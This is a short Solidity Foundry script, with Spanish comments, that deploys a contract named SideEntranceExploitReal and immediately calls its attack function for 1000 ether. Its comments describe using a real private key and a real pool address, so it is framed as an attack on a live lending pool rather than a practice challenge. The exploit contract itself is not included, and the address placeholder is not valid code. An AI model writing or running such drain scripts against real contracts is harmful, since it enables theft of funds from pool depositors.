// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {Script} from "forge-std/Script.sol";
import {SideEntranceExploitReal} from "../src/SideEntranceExploitReal.sol";

contract DeployAndAttack is Script {
    function run() external {
        // Carga tu llave privada real configurada de forma segura en tu entorno (.env)
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        vm.startBroadcast(deployerPrivateKey);

        // 1. Despliegue atómico en la misma tx
        SideEntranceExploitReal exploit = new SideEntranceExploitReal(
            0xPoolRealAddress...
        );

        // 2. Ejecución inmediata del ataque
        exploit.attack(1000 ether);

        vm.stopBroadcast();
    }
}
